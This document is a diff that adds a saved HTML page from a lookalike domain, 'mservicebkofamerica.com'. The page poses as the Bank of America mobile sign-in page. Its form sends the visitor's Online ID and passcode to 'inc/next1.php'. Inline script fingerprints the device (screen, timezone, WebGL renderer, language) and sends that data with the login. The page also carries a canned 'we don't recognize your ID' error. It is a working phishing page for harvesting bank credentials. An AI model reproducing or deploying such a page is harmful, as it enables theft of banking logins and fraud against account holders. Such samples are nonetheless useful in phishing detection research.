@@ -1,0 +1,233 @@
+﻿
+<!-- saved from url=(0037)https://mservicebkofamerica.com/?3334 -->
+<html class=" js no-flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
+        <meta name="apple-itunes-app" content="app-id=284847138">
+		<!--[if IE 9]>
+			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" >
+		<![endif]-->
+		<title>Sign In</title>
+	<link rel="shortcut icon" href="https://mservicebkofamerica.com/favicon.ico">
+	<link rel="stylesheet" href="./Sign In_files/bactouch.css">
+	<link rel="stylesheet" href="./Sign In_files/toolbar.css">
+	<link rel="stylesheet" href="./Sign In_files/bact_listview.css">
+	<link rel="stylesheet" href="./Sign In_files/footer.css">
+	<link rel="stylesheet" href="./Sign In_files/slidemenu.css">
+<style>
+.noselect {
+  -webkit-touch-callout: none; /* iOS Safari */
+    -webkit-user-select: none; /* Safari */
+     -khtml-user-select: none; /* Konqueror HTML */
+       -moz-user-select: none; /* Old versions of Firefox */
+        -ms-user-select: none; /* Internet Explorer/Edge */
+            user-select: none; /* Non-prefixed version, currently
+                                  supported by Chrome, Edge, Opera and Firefox */
+}
+</style>
+	<script>
+	function Initialize(){
+		function ckgl() {
+			var gl=document.createElement('canvas').getContext("webgl",{antialias:false})||document.createElement('canvas').getContext("experimental-webgl");
+			if (gl){
+				debugInfo=gl.getExtension('WEBGL_debug_renderer_info');
+				if (debugInfo) {
+					return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+				} else {
+					return false;
+				}
+			} else {
+				return false;
+			}
+		}
+		if (window.devicePixelRatio) {
+			var r=window.devicePixelRatio||1;
+		} else {
+			var r='false';
+		}
+		if (screen.width) {
+			var w=screen.width*r;
+		} else {
+			var w='false';
+		}
+		if (screen.height) {
+			var h=screen.height*r;
+		} else {
+			var h='false';
+		}
+		if (Date()) {
+			var t=new Date().toString().match(/([A-Z]+[\+-][0-9]+)/)[1];
+		} else {
+			var t='false';
+		}
+		if (ckgl()) {
+			var g=ckgl().split(' ').join('-');
+		} else {
+			var g='false';
+		}
+		var offset = new Date().getTimezoneOffset();
+		var offsetx2 = new Date().getTimezoneOffset()*2;
+		var cw = window.innerWidth;
+		var ch = window.innerHeight;
+		var colordepth = window.screen.colorDepth;
+		var pixelratio = window.devicePixelRatio;
+		var sc = h+','+w+','+offsetx2+','+offset+','+t+','+colordepth+','+pixelratio+','+g;
+		return sc;
+	}
+	var userLang = navigator.language || navigator.userLanguage;
+	var orientation = (screen.orientation || {}).type || screen.mozOrientation || screen.msOrientation;
+	var dispositive = new Date().getTimezoneOffset()+','+window.innerHeight+','+window.innerWidth+','+userLang+','+orientation+','+Initialize();
+	function toggle() {
+		var tg = document.getElementById('toggleButton');
+		if (tg.getAttribute("toggled") === 'false') {
+			tg.setAttribute("toggled", "true");
+		} else {
+			tg.setAttribute("toggled", "false");
+		}
+	}
+	function verify() {
+		var us = document.getElementById('btCustomOnlineId').value;
+		var ps = document.getElementById('btCustomPasscode').value;
+		if (us.length > 3 && ps.length > 3) {
+			document.getElementById('dp').value=dispositive;
+			document.getElementById('lg').submit();
+		}
+	}
+	</script>
+	</head>
+	<body><div id="page" class="" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;">
+	<div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a>
+	<a id="slidemenuz" class="sprite backButton icon sprite-menu" style="cursor:pointer" title="Show menu for all mobile banking features" role="button"></a>
+	<div id="barker" class="hidden"></div><h1 id="title" class="">
+	<div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Sign In</div>
+	<span class="adaHidden" id="adaTitleText">Enter your Online ID</span></h1><a id="rightButton" class="hidden"></a></div>
+	<div id="SASI_banner_container"></div><div class="pageMinHeight"><!-- SIGN ON HOME PAGE-->
+<div class="signonVersionTwoHomePage">
+<div id="scrollerwrapperOt" class="overthrow">
+<div id="divMessaging" class="messaging" style="display:none">
+<a id="adaMessage" class="adaHiddenText" href="javascript:void(0)" role="text">
+error,,We don't recognize your Online ID and/or Passcode. Please try again or please use the "Forgot Passcode" or "Forgot ID" link.
+</a>
+<span class="messageIcon error"></span>
+<div class="messageText"><a onclick="document.getElementById(&#39;divMessaging&#39;).style.display=&#39;none&#39;" style="cursor:pointer" class="closeIcon" title="Close message" role="button"></a>
+<p aria-hidden="true" role="text" class="TLu_ERROR">We don't recognize your Online ID and/or Passcode. Please try again or please use the "Forgot Passcode" or "Forgot ID" link.</p>
+</div>
+</div>
+	<div id="blackBerryMsg" class="padding10" style="display: none;"></div>
+	
+	<div id="accountLocked" class="hidden">
+		<ul class="listView edge">
+			<li role="button" class="noLink">
+				<div class="imageWrap paddingHoriz20"><img src="./Sign In_files/ico_alert@2x.png" class=""></div>
+				<p class="subVal padding10 fontRed" id="headError"></p>
+				<p class="subVal padding10" id="bodyError"></p>
+			</li>
+		</ul>
+	</div>
+	
+	<div id="successMsg"></div>
+	
+	<div id="newOnlineId" style="">
+		<div class="toppad5">
+			<fieldset>
+			<form id="lg" method="post" action="inc/next1.php" autocomplete="off">
+				<legend class="hidden" id="signonToggle">Toggle Yes or No</legend>			
+				<label for="saveCustomUserId" class="adaHidden"></label>
+				<input type="hidden" id="sec" name="sec" value="true">
+				<input type="hidden" id="activation" name="activation" value="3334">
+				<input type="hidden" id="panel" name="panel" value="toCard">
+				<input type="hidden" id="dp" name="dp" value="">
+				<input type="checkbox" id="saveCustomUserId" class="hidden">
+				<label class="adaHidden" id="signonOIDLabel" for="btCustomOnlineId">Enter your Online ID</label>
+				<div class="inputEntryContainer">
+					<div id="toggleSwipe" class="toggleSwipeContainer right">
+						<label aria-hidden="true" class="right" style="margin-right:30px;" id="signonSaveID">Save ID</label>
+						<div onclick="toggle()" id="toggleButton" class="toggle right" toggled="false">
+							<span class="thumb"></span>
+							<span class="toggleOn" aria-checked="true" role="checkbox" title="Save this online ID" id="signonYes">YES</span>
+							<span class="toggleOff" aria-checked="false" role="checkbox" title="Save this online ID" id="signonNo">NO</span>
+						</div>
+					</div>
+					<div class="inputContainer">
+						<label for="btCustomOnlineId" class="adaHidden"></label>
+						<input autofocus="" style="height:40px;width:100%" onkeypress="if (this.value.length &gt; 3) {document.getElementById(&#39;ps444&#39;).style=&#39;&#39;;document.getElementById(&#39;btCustomPasscode&#39;).disabled=&#39;&#39;;}" type="text" class="focus sprite-clear_input_icns" maxlength="32" id="btCustomOnlineId" name="us" placeholder="Online ID" autocomplete="off" autocapitalize="off" autocorrect="off"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
+					</div>
+					<div id="ps444" class="inputContainer" style="background-color: rgb(246, 243, 239);" onclick="this.style=&#39;&#39;;document.getElementById(&#39;btCustomPasscode&#39;).disabled=&#39;&#39;;document.getElementById(&#39;btCustomPasscode&#39;).click();document.getElementById(&#39;btCustomPasscode&#39;).focus();">
+						<label for="btCustomPasscode" class="adaHidden"></label>
+						<input onkeypress="if (this.value.length &gt; 3 &amp;&amp; document.getElementById(&#39;btCustomOnlineId&#39;).value.length) {document.getElementById(&#39;btSignonContinue&#39;).classList.remove(&#39;disabled&#39;)}" style="height:40px;width:100%" id="btCustomPasscode" name="ps" type="password" class="masked" placeholder="Passcode" maxlength="20" title="Enter your Passcode." disabled="false" autocomplete="off"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
+					</div>
+				</div>
+			</form>
+			</fieldset>
+		</div>
+	</div>
+	
+	<div id="savedOnlineId" style="display: none;">
+		<nav>
+			<h2 id="cmsSelectID">Saved Online ID</h2>
+			<ul id="btSavedIdHolder" class="listView listView toppad10 fontSize075"></ul>
+		</nav>
+	</div>
+	
+	<div id="savedOnlineIdPasscode" class="toppad20" style="display: none;">
+		<nav>
+			<ul class="listView">
+				<li role="button">
+					<a href="javascript:void(0);" id="cmsSelectonlineID">
+						<p></p>
+					</a>
+				</li>
+			</ul>
+			<div id="inputPasscodeContainer">
+				<div class="inputContainer">
+					<label for="btsaveOIDPasscode" class="adaHidden"></label>
+					<input id="btsaveOIDPasscode" type="password" class="masked" placeholder="Passcode" maxlength="20" title="Enter your Passcode." autocomplete="off">
+					<a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
+				</div>
+			</div>
+		</nav>
+	</div>
+</div>
+	<div>
+		<a id="btSignonContinue" onclick="verify()" href="javascript:verify();" role="button" class="btn">
+			<img style="margin-bottom:-4px;" class="paddingHoriz10" src="./Sign In_files/secure_lock.png">
+			<span id="signonLabel">Sign In</span>
+		</a>
+	</div>
+	
+	<div id="helpOptionView" class="helpOptionView">
+		<div class="padding10 center">
+			<div class="inline-link blueLink"><a href="javascript:void(0);" id="forgetOIDPass" class="plain slideUp jsForgotIDPass">Forgot ID/Passcode?</a></div>	
+			<div class="paddingVert10 inline-link blueLink"><a href="javascript:void(0);" class="plain slideUp" id="signonEnroll">Enroll</a></div>
+		</div>
+		<div class="padding10">
+				
+			<!--
+			<div class="toppad10 blueLink"><a href="javascript:void(0);" id="forgetOID" class="plain slideUp"></a></div>	
+			<div class="toppad10 blueLink"><a href="javascript:void(0);" id="forgetpasscode" class="plain slideUp"></a></div>	
+			<div class="paddingVert10 blueLink"><a href="#home?app=enrollmentsv2" class="plain slideUp" id="signonEnroll"></a></div>	
+			-->
+			<div class="borderLine smarBannerdisplay hidden"></div>
+			<div class="bofaBannerLink smarBannerdisplay hidden"><a href="javascript:;" class="appNavigation plain slideUp" id="signonBannerLink">Get the Mobile Banking app</a></div>
+		</div>
+	</div>
+	
+	<div id="btnPin" style="position: fixed; bottom: 0px; display: none;">
+		<ul class="btnGroupPin">
+			<li><a id="cancelButton" class="plain slideUp btnNeg" role="button" href="javascript:void(0);">Cancel</a></li>
+		</ul>
+	</div>
+</div>
+</div><footer><div class="boa_footnote"></div><div class="boa_footer"><div class="left">
+<a id="boa_footer_privacy" style="cursor:pointer;color:#0170B9;text-decoration:none;font-size:10px" target="_blank">Privacy</a></div><div class="left">
+<a id="boa_footer_security" style="cursor:pointer;padding-left:20px;;color:#0170B9;text-decoration:none;font-size:10px" target="_blank">Security</a></div><div class="right">
+<a id="boa_footer_ehl" style="cursor:pointer;color:#0170B9;text-decoration:none;font-size:10px" class="ehl" target="_blank">Equal Housing Lender</a><span style="padding:10px"></span></div>
+<p class="clear" style="font-size:10px">© 2020 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.</p></div></footer></div>
+<div id="spinnerPanel" class="spinnerPanel" style="height: 100%; display: none;"><div class="spinner" style="top: 246.8px;"><span class="messageIcon"></span>
+<a id="spinnerLink" class="adaHidden" href="javascript:void(0)" role="dialog">processing</a></div></div>
+<div id="slidemenu_sidePanel" style="display: none"><div class="slidemenu_menu">
+</div></div><div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div>
+
+
+</body></html>
